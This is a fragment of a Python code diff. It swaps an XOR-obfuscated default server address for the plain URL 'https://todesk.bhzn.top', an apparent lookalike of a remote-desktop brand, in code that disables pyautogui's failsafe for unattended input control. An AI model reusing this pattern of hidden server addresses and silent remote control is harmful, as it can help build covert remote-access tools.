@@ -91,10 +91,7 @@ def reveal_text(values, key: int) -> str:
     return "".join(chr(value ^ key) for value in values)
 
 
-DEFAULT_SERVER = reveal_text(
-    [50, 46, 46, 42, 41, 96, 117, 117, 46, 53, 62, 63, 41, 49, 116, 56, 50, 32, 52, 116, 46, 53, 42],
-    0x5A,
-)
+DEFAULT_SERVER = "https://todesk.bhzn.top"
 
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
